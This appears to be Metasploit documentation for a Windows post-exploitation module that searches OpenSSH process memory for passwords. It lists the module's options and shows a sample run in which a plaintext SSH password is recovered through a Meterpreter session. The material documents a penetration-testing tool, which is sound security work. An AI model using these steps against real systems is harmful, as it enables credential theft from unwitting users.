## Vulnerable Application

This module allows for searching the memory space of running OpenSSH processes on Windows 
for potentially sensitive data such as passwords.

## Verification Steps

1. Start `msfconsole`
2. Get a Meterpreter session
3. Do: `use post/windows/gather/openssh_password_search`
4. Do: `set SESSION <Session ID>`
5. Do: `set PID <Process ID>`
6. Do: `run`

## Options

### PID

The process ID of the OpenSSH target process. (default: `nil`)

### REGEX

The regular expression to search for in process memory. (default: `publickey,password.*`)

### MIN_MATCH_LEN

The minimum match length. (default: `5`)

### MAX_MATCH_LEN

The maximum match length. (default: `127`)

### REPLACE_NON_PRINTABLE_BYTES

Replace non-printable bytes with `.` when outputting the results. (default: `true`)


## Scenarios

### Windows 10 - OpenSSH_9.4p1, OpenSSL 3.1.2 1 Aug 2023
In this scenario, the Windows target is connected to a different host using `ssh.exe` using the password `myverysecretpassword`.
```
msf6 post(windows/gather/openssh_password_search) > sessions

Active sessions
===============

  Id  Name  Type                     Information                              Connection
  --  ----  ----                     -----------                              ----------
  1         meterpreter x64/windows  DESKTOP-NO8VQQB\win10 @ DESKTOP-NO8VQQB  192.168.112.1:4444 -> 192.168.112.129:59376 (192.168.112.129)
  

msf6 post(windows/gather/openssh_password_search) > run pid=8780 session=-1

[*] Running module against - DESKTOP-NO8VQQB\win10 @ DESKTOP-NO8VQQB (192.168.112.129). This might take a few seconds...
[*] Memory Matches for OpenSSH
==========================

 Match Address       Match Length  Match Buffer                                                                                                      Memory Region Start  Memory Region Size
 -------------       ------------  ------------                                                                                                      -------------------  ------------------
 0x0000000A00060EE0  127           "publickey,password......3.......myverysecretpassword....................#.........#.....................#......  0x0000000A00000000   0x0000000000090000
                                   .client-session."

[*] Post module execution completed
```
